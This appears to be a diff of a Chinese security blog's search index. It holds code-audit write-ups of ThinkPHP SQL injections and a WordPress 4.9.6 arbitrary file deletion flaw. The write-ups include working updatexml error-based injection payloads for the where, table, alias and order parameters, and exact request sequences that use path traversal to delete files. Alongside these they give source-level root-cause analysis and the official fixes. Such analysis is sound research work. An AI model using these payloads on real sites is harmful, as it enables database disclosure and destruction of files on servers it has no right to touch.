-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id[where]&#x3D;1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://tva4.sinaimg.cn/large/00774lbQly1gsxo654rfnj61ef0j2wye02.jpg" alt="image-20210729100459301"></p>
-<h2 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>我们直接下断点然后开始进入<code>I方法</code>对接收的参数进行分割判断然后进行一次 <code>htmlspecialchars </code>和 <code>think_filter</code> 的过滤处理</p>
-<p>随后从<code>I方法</code>中出来之后就进入到了<code> find</code> 方法中然后跟进<code>_parseOptions</code></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">_parseOptions</span>(<span class="params"><span class="variable">$options</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(is_array(<span class="variable">$options</span>))</span><br><span class="line">        <span class="variable">$options</span> = array_merge(<span class="keyword">$this</span>-&gt;options,<span class="variable">$options</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$options</span>[<span class="string">&#x27;table&#x27;</span>]))&#123;</span><br><span class="line">        <span class="comment">// 自动获取表名</span></span><br><span class="line">        <span class="variable">$options</span>[<span class="string">&#x27;table&#x27;</span>]   =   <span class="keyword">$this</span>-&gt;getTableName();</span><br><span class="line">        <span class="variable">$fields</span> = <span class="keyword">$this</span>-&gt;fields;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">// 指定数据表 则重新获取字段列表 但不支持类型检测</span></span><br><span class="line">        <span class="variable">$fields</span> = <span class="keyword">$this</span>-&gt;getDbFields();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 数据表别名</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;alias&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$options</span>[<span class="string">&#x27;table&#x27;</span>]  .=   <span class="string">&#x27; &#x27;</span>.<span class="variable">$options</span>[<span class="string">&#x27;alias&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 记录操作的模型名称</span></span><br><span class="line">    <span class="variable">$options</span>[<span class="string">&#x27;model&#x27;</span>]  = <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">    <span class="comment">// 字段类型验证</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>]) &amp;&amp; is_array(<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$fields</span>) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$options</span>[<span class="string">&#x27;join&#x27;</span>])) &#123;</span><br><span class="line">        <span class="comment">// 对数组查询条件进行字段类型检查</span></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>] <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;</span><br><span class="line">            <span class="variable">$key</span>            =   trim(<span class="variable">$key</span>);</span><br><span class="line">            <span class="keyword">if</span>(in_array(<span class="variable">$key</span>,<span class="variable">$fields</span>,<span class="literal">true</span>))&#123;</span><br><span class="line">                <span class="keyword">if</span>(is_scalar(<span class="variable">$val</span>)) &#123;</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;_parseType(<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>],<span class="variable">$key</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">elseif</span>(!is_numeric(<span class="variable">$key</span>) &amp;&amp; <span class="string">&#x27;_&#x27;</span> != substr(<span class="variable">$key</span>,<span class="number">0</span>,<span class="number">1</span>) &amp;&amp; <span class="literal">false</span> === strpos(<span class="variable">$key</span>,<span class="string">&#x27;.&#x27;</span>) &amp;&amp; <span class="literal">false</span> === strpos(<span class="variable">$key</span>,<span class="string">&#x27;(&#x27;</span>) &amp;&amp; <span class="literal">false</span> === strpos(<span class="variable">$key</span>,<span class="string">&#x27;|&#x27;</span>) &amp;&amp; <span class="literal">false</span> === strpos(<span class="variable">$key</span>,<span class="string">&#x27;&amp;&#x27;</span>))&#123;</span><br><span class="line">                <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;strict&#x27;</span>]))&#123;</span><br><span class="line">                    E(L(<span class="string">&#x27;_ERROR_QUERY_EXPRESS_&#x27;</span>).<span class="string">&#x27;:[&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;=&gt;&#x27;</span>.<span class="variable">$val</span>.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                &#125; </span><br><span class="line">                <span class="keyword">unset</span>(<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>][<span class="variable">$key</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 查询过后清空sql表达式组装 避免影响下次查询</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;options  =   <span class="keyword">array</span>();</span><br><span class="line">    <span class="comment">// 表达式过滤</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;_options_filter(<span class="variable">$options</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$options</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这其实是一个关键赋值的操作可以引申我们其他的exp</p>
-<p>我们走完<code>_parseOptions</code> <code>$options</code>如下 </p>
-<p><img src="https://tvax4.sinaimg.cn/large/00774lbQly1gsxo6b0jt4j30xc0kojzs.jpg" alt="image-20210729104759128"></p>
-<p>我们现在进入<code>$this-&gt;db-&gt;select</code>中</p>
-<p><img src="https://tvax1.sinaimg.cn/large/00774lbQly1gsxo6guj9gj311f06bdky.jpg" alt="image-20210729104944286"></p>
-<p>继续跟进<code>$this-&gt;buildSelectSql</code></p>
-<p><img src="https://tva2.sinaimg.cn/large/00774lbQly1gsxo6lten3j310p09htew.jpg" alt="image-20210729105024254"></p>
-<p>继续跟进<code>$this-&gt;parseSql</code></p>
-<p>因为我们payload是<code>id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--</code></p>
-<p>所以我们只关心<code>parseWhere</code></p>
-<p><img src="https://tvax2.sinaimg.cn/large/00774lbQly1gsxo6qkr6rj311i0eck11.jpg" alt="image-20210729105430536"></p>
-<p>可以看到没有做任何处理直接返回，所以造成了注入</p>
-<p><img src="https://tvax1.sinaimg.cn/large/00774lbQly1gsxo6v5pqij31390fdwpp.jpg" alt="image-20210729105542661"></p>
-<p>我们回到我上面贴的<code>_parseOptions</code>方法代码，为什么说这里可以引申我们其他exp</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id[<span class="keyword">table</span>]<span class="operator">=</span>users <span class="keyword">where</span> <span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,<span class="keyword">user</span>(),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">--</span></span><br><span class="line">id[alias]<span class="operator">=</span><span class="keyword">where</span><span class="operator">%</span><span class="number">201</span><span class="operator">%</span><span class="number">20</span><span class="keyword">and</span><span class="operator">%</span><span class="number">20</span>updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,<span class="keyword">user</span>(),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">--</span></span><br><span class="line">id[<span class="keyword">where</span>]<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">20</span><span class="keyword">and</span><span class="operator">%</span><span class="number">20</span>updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,<span class="keyword">user</span>(),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">--</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$options</span>[<span class="string">&#x27;table&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">// 自动获取表名</span></span><br><span class="line">    <span class="variable">$options</span>[<span class="string">&#x27;table&#x27;</span>] = <span class="keyword">$this</span>-&gt;getTableName();</span><br><span class="line">    <span class="variable">$fields</span>  = <span class="keyword">$this</span>-&gt;fields;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">// 指定数据表 则重新获取字段列表 但不支持类型检测</span></span><br><span class="line">    <span class="variable">$fields</span>  = <span class="keyword">$this</span>-&gt;getDbFields();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 数据表别名</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;alias&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$options</span>[<span class="string">&#x27;table&#x27;</span>]  .=   <span class="string">&#x27; &#x27;</span>.<span class="variable">$options</span>[<span class="string">&#x27;alias&#x27;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>1、当我们存在table的话是不是就不需要获取表名。但是有局限性我们得自己知道表名。</p>
-<p>2、当我们存在alias的话。因为不为空进行拼接就构成了我们exp1的形式</p>
-<h1 id="order-by注入"><a href="#order-by注入" class="headerlink" title="order by注入"></a>order by注入</h1><h2 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>测试代码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Home</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$username</span> = I(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">        <span class="variable">$order</span> = I(<span class="string">&quot;order&quot;</span>);</span><br><span class="line">        <span class="variable">$data</span> = M(<span class="string">&quot;users&quot;</span>)-&gt;where(<span class="keyword">array</span>(<span class="string">&quot;username&quot;</span>=&gt;<span class="variable">$username</span>))-&gt;order(<span class="variable">$order</span>)-&gt;select();</span><br><span class="line">        dump(<span class="variable">$data</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>正常流程</p>
-<p><img src="https://tvax3.sinaimg.cn/large/00774lbQly1gsxo72yltsj31270lfq88.jpg" alt="image-20210729112032146"></p>
-<p>我们的payload</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?username&#x3D;admin&amp;order[updatexml(1,concat(0x3a,user()),1)]</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://tvax1.sinaimg.cn/large/00774lbQly1gsxo79l74jj31cy0j74gd.jpg" alt="image-20210729112157845"></p>
-<h2 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>问题出现在order上那我们就直接到关键代码吧，流程和上面都一样。</p>
-<p>直接来到<code>Library\Think\Db\Driver.class.php</code></p>
-<p><img src="https://tvax3.sinaimg.cn/large/00774lbQly1gsxo7eg0i2j31670mxdzj.jpg" alt="image-20210729112858917"></p>
-<p>一样没有任何过滤直接返回</p>
-<p><img src="https://tva2.sinaimg.cn/large/00774lbQly1gsxo7j44hwj313f0j9n9k.jpg" alt="image-20210729113145010"></p>
-<p>最终完成语句的拼接</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT * FROM &#96;users&#96; WHERE &#96;username&#96; &#x3D; &#39;admin&#39; ORDER BY updatexml(1,concat(0x3a,user()),1)  </span><br></pre></td></tr></table></figure>
-
+<p>最后放一个七月火师傅的总结【最后有七月火师傅的链接，大家可以看七月火师傅的。我也是跟着学习】</p>
+<p><img src="https://tvax3.sinaimg.cn/large/00774lbQly1gt3fzfzebpj31041citx0.jpg" alt="7"></p>
+<h2 id="漏洞修复-5"><a href="#漏洞修复-5" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>官方的修复方法是：当匹配到除了 <strong>字母、点号、星号</strong> 以外的字符时，就抛出异常。</p>
+<p><img src="https://tva2.sinaimg.cn/large/00774lbQly1gt3fztc3nfj31da0aj43z.jpg" alt="image-20210802172105742"></p>
+<h1 id="ThinkPHP-5-0-9鸡肋注入"><a href="#ThinkPHP-5-0-9鸡肋注入" class="headerlink" title="ThinkPHP 5.0.9鸡肋注入"></a>ThinkPHP 5.0.9鸡肋注入</h1><h2 id="漏洞概要-5"><a href="#漏洞概要-5" class="headerlink" title="漏洞概要"></a>漏洞概要</h2><p>为什么说是鸡肋注入，因为TP5使用PDO查询。<strong>将参数与查询语句分离</strong>导致我们这个注入不支持子查询。就只能利用报错注入爆出一些内置函数。</p>
+<h2 id="关于这个漏洞的一些简单思考"><a href="#关于这个漏洞的一些简单思考" class="headerlink" title="关于这个漏洞的一些简单思考"></a>关于这个漏洞的一些简单思考</h2><p>这里就不复现了。下面会放P牛的那篇文章，这里就写一写我对这个鸡肋漏洞的思考吧。</p>
+<p>除了这一个洞，上面的所有SQL注入都是可以报数据的。当然我们不能用XPATH来爆，不然就会提示。</p>
+<p><img src="https://tvax3.sinaimg.cn/large/00774lbQly1gt3fzyphlfj31es0fyame.jpg" alt="image-20210803103755324"></p>
+<p>仅仅支持常量。我们去wireshark发现在第一步预处理已经报错不走了。</p>
+<p><img src="https://tva4.sinaimg.cn/large/00774lbQly1gt3g057wp3j30us0mch39.jpg" alt="image-20210803104118159"></p>
+<p>常量？何为常量，广义来讲也就是不变的量。用P牛的话来讲</p>
+<blockquote>
+<p>预编译的确是mysql服务端进行的，但是预编译的过程是不接触数据的 ，也就是说不会从表中将真实数据取出来，所以使用子查询的情况下不会触发报错；虽然预编译的过程不接触数据，但类似user()这样的数据库函数的值还是将会编译进SQL语句，所以这里执行并爆了出来。</p>
+</blockquote>
+<p>因为像user() database()这就是常量因为他是库函数。</p>
+<p>那我们是否可以不用XPATH来爆呢。他不是提示<strong>Only constant XPATH queries are supported</strong></p>
+<p>当然是可以的，他回进行预处理-&gt;绑定-&gt;执行-&gt;报错</p>
+<p>那这个洞是到底可以不可以呢？</p>
+<p><img src="https://tvax2.sinaimg.cn/large/00774lbQly1gt3g0b2378j31du0fyk4a.jpg" alt="image-20210803104928062"></p>
+<p>提示的是参数为定义。那是哪一步出的问题呢？</p>
+<p><img src="https://tvax4.sinaimg.cn/large/00774lbQly1gt3g0g0e0yj316x0n5nh6.jpg" alt="image-20210803110430196"></p>
+<p>进入$this-&gt;query-&gt;bind发现赋值给this返回了</p>
+<p><img src="https://tva4.sinaimg.cn/large/00774lbQly1gt3g0lvgi5j31790giqdj.jpg" alt="image-20210803110546415"></p>
+<p>回到Query.php中<code>$bind = $this-&gt;getBind();</code>// 获取参数绑定</p>
+<p><img src="https://tvax2.sinaimg.cn/large/00774lbQly1gt3g0qh080j311w0bktej.jpg" alt="image-20210803110654535"></p>
+<p>发现又返回给了bind后面预处理之后的调用了bind。</p>
+<p><img src="https://tvax1.sinaimg.cn/large/00774lbQly1gt3g0uvk90j30s009v42o.jpg" alt="image-20210803111750037"></p>
+<p><img src="https://tvax1.sinaimg.cn/large/00774lbQly1gt3g0zfjoyj315j0j0wom.jpg" alt="image-20210803111929939"></p>
+<p>执行的时候又获取bind当我们看wireshark或许就可以发现答案</p>
+<p><img src="https://tvax2.sinaimg.cn/large/00774lbQly1gt3g14361tj31b50b648i.jpg" alt="image-20210803111959174"></p>
+<p>所以到bind时候就会报错。报参数未定义。因为这个漏洞我们利用的就是IN这里所以要加<code>,</code>or<code>)</code>等</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>七月火前辈：<a href="https://github.com/Mochazz/ThinkPHP-Vuln">https://github.com/Mochazz/ThinkPHP-Vuln</a></p>
+<p>P牛：<a href="https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html">https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html</a></p>
 ]]></content>
       <tags>
         <tag>SQL注入</tag>
         <tag>代码审计</tag>
         <tag>ThinkPHP</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Wordpress任意文件删除漏洞</title>
-    <url>/2021/07/29/Wordpress-4-9-6-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<center>Wordpress <= 4.9.6任意文件删除漏洞</center>
-
-<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
-<p>从 3.7.0 版本开始， WordPress 在用户登录时，会在后台对小版本的改变进行更新，这样不利于我们分析代码。我们可以通过将 AUTOMATIC_UPDATER_DISABLED 设置成 true ，来禁止 WordPress 后台自动更新（在 wp-config.php 文件开头添加 define(‘AUTOMATIC_UPDATER_DISABLED’, true); 即可）。</p>
-</blockquote>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>​    先在自己目录下面简单建一个文件，方便测试。WordPress中如果把<code>wp-config.php</code>文件删除系统会重装的。</p>
-<p>我们需要一个角色，最低是一个作者。</p>
-<p><img src="https://tvax4.sinaimg.cn/large/00774lbQly1gsmji0fvn2j30x80o143x.jpg" alt="image-20210719111653371"></p>
-<p>然后用test用户登录，如下图操作。再点编辑。</p>
-<p><img src="https://tvax2.sinaimg.cn/large/00774lbQly1gsmji5wcsbj31ec0gytfn.jpg" alt="image-20210719111910193"></p>
-<p>然后我们在F12里面搜索<code>_wpnonce</code>找到这两个东西</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;input type&#x3D;&quot;hidden&quot; id&#x3D;&quot;_wpnonce&quot; name&#x3D;&quot;_wpnonce&quot; value&#x3D;&quot;09a8cc3a73&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;a class&#x3D;&quot;submitdelete deletion&quot; onclick&#x3D;&quot;return showNotice.warn();&quot; href&#x3D;&quot;http:&#x2F;&#x2F;localhost&#x2F;dmsj&#x2F;wordpress49&#x2F;wp-admin&#x2F;post.php?post&#x3D;6&amp;action&#x3D;delete&amp;_wpnonce&#x3D;004d81ba04&quot;&gt;永久删除&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>
-
-<p>然后点击更新然后抓包到<code>Repeater</code></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;input type&#x3D;&quot;hidden&quot; id&#x3D;&quot;_wpnonce&quot; name&#x3D;&quot;_wpnonce&quot; value&#x3D;&quot;09a8cc3a73&quot;&gt;</span><br><span class="line">&#x2F;&#x2F; 将POST包替换为如下 其中post_ID对应你URL对应的POST  </span><br><span class="line">&#x2F;&#x2F; thumb对应删除文件 _wpnonce对应上面的value</span><br><span class="line">POST值</span><br><span class="line">action&#x3D;editattachment&amp;_wpnonce&#x3D;09a8cc3a73&amp;post_ID&#x3D;6&amp;thumb&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;test.txt</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://tvax2.sinaimg.cn/large/00774lbQly1gsmjibftllj30yh0pjqit.jpg" alt="image-20210719133908256"></p>
-<p>这样子是证明写入数据库了，报错就说明失败了。我们查看wp_postmeta发现成功写入</p>
-<p><img src="https://tva4.sinaimg.cn/large/00774lbQly1gsmjifzw68j310t0al10t.jpg" alt="image-20210719134001572"></p>
-<p>然后我们第二步</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_wpnonce&#x3D;004d81ba04&quot;&gt;永久删除&lt;&#x2F;a&gt;</span><br><span class="line">&#x2F;&#x2F; GET请求下面URL  _wpnonce对应上面的值</span><br><span class="line">&#x2F;wp-admin&#x2F;post.php?post&#x3D;6&amp;action&#x3D;delete&amp;_wpnonce&#x3D;004d81ba04</span><br></pre></td></tr></table></figure>
-
-<p>然后我们的文件以及被删除</p>
-<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>倒着来分析吧，首先直接定位wp-admin/post.php文件246行</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">&#x27;delete&#x27;</span>:</span><br><span class="line">	check_admin_referer(<span class="string">&#x27;delete-post_&#x27;</span> . <span class="variable">$post_id</span>);</span><br><span class="line">	<span class="keyword">if</span> ( ! <span class="variable">$post</span> )</span><br><span class="line">		wp_die( __( <span class="string">&#x27;This item has already been deleted.&#x27;</span> ) );</span><br><span class="line">	<span class="keyword">if</span> ( ! <span class="variable">$post_type_object</span> )</span><br><span class="line">		wp_die( __( <span class="string">&#x27;Invalid post type.&#x27;</span> ) );</span><br><span class="line">	<span class="keyword">if</span> ( ! current_user_can( <span class="string">&#x27;delete_post&#x27;</span>, <span class="variable">$post_id</span> ) )</span><br><span class="line">		wp_die( __( <span class="string">&#x27;Sorry, you are not allowed to delete this item.&#x27;</span> ) );</span><br><span class="line">	<span class="keyword">if</span> ( <span class="variable">$post</span>-&gt;post_type == <span class="string">&#x27;attachment&#x27;</span> ) &#123;</span><br><span class="line">		<span class="variable">$force</span> = ( ! MEDIA_TRASH );</span><br><span class="line">		<span class="keyword">if</span> ( ! wp_delete_attachment( <span class="variable">$post_id</span>, <span class="variable">$force</span> ) )</span><br><span class="line">			wp_die( __( <span class="string">&#x27;Error in deleting.&#x27;</span> ) );</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> ( ! wp_delete_post( <span class="variable">$post_id</span>, <span class="literal">true</span> ) )</span><br><span class="line">			wp_die( __( <span class="string">&#x27;Error in deleting.&#x27;</span> ) );</span><br><span class="line">	&#125;</span><br><span class="line">	wp_redirect( add_query_arg(<span class="string">&#x27;deleted&#x27;</span>, <span class="number">1</span>, <span class="variable">$sendback</span>) );</span><br><span class="line">	<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure>
-
-<p>由于我们删除的是图片附件，所以程序会进入<code>wp_delete_attachment</code>函数。wp-include/post.php。截取关键部分5002行</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( ! <span class="keyword">empty</span>(<span class="variable">$meta</span>[<span class="string">&#x27;thumb&#x27;</span>]) ) &#123;  <span class="comment">//5002行</span></span><br><span class="line">	<span class="keyword">if</span> (! <span class="variable">$wpdb</span>-&gt;get_row( <span class="variable">$wpdb</span>-&gt;prepare( <span class="string">&quot;SELECT meta_id FROM <span class="subst">$wpdb</span>-&gt;postmeta WHERE meta_key = &#x27;_wp_attachment_metadata&#x27; AND meta_value LIKE %s AND post_id &lt;&gt; %d&quot;</span>, <span class="string">&#x27;%&#x27;</span> . <span class="variable">$wpdb</span>-=&gt;esc_like(<span class="variable">$meta</span>[<span class="string">&#x27;thumb&#x27;</span>] ) . <span class="string">&#x27;%&#x27;</span>, <span class="variable">$post_id</span>)) ) &#123;</span><br><span class="line">	<span class="variable">$thumbfile</span> = str_replace(basename(<span class="variable">$file</span>), <span class="variable">$meta</span>[<span class="string">&#x27;thumb&#x27;</span>], <span class="variable">$file</span>);</span><br><span class="line">	<span class="variable">$thumbfile</span> = apply_filters( <span class="string">&#x27;wp_delete_file&#x27;</span>, <span class="variable">$thumbfile</span> );</span><br><span class="line">	@ unlink( path_join(<span class="variable">$uploadpath</span>[<span class="string">&#x27;basedir&#x27;</span>], <span class="variable">$thumbfile</span>) );</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
-
-<p>然而<code>$meta[&#39;thumb&#39;]</code>可控并且没有任何过滤。从数据库中带出来【为什么从数据库带出来呢】</p>
-<p>在/wp-admin/post.php文件中，也就是我们第一步POST传入的值。直接带进去的更新我们的图片文件。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">&#x27;editattachment&#x27;</span>:  <span class="comment">//178行</span></span><br><span class="line">	check_admin_referer(<span class="string">&#x27;update-post_&#x27;</span> . <span class="variable">$post_id</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Don&#x27;t let these be changed</span></span><br><span class="line">	<span class="keyword">unset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guid&#x27;</span>]);</span><br><span class="line">	<span class="variable">$_POST</span>[<span class="string">&#x27;post_type&#x27;</span>] = <span class="string">&#x27;attachment&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Update the thumbnail filename</span></span><br><span class="line">	<span class="variable">$newmeta</span> = wp_get_attachment_metadata( <span class="variable">$post_id</span>, <span class="literal">true</span> );</span><br><span class="line">	<span class="variable">$newmeta</span>[<span class="string">&#x27;thumb&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;thumb&#x27;</span>];</span><br><span class="line">	wp_update_attachment_metadata( <span class="variable">$post_id</span>, <span class="variable">$newmeta</span> );</span><br></pre></td></tr></table></figure>
-
-<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>过滤$_POST[‘thumb’]</p>
-]]></content>
-      <tags>
-        <tag>代码审计</tag>
       </tags>
   </entry>
 </search>
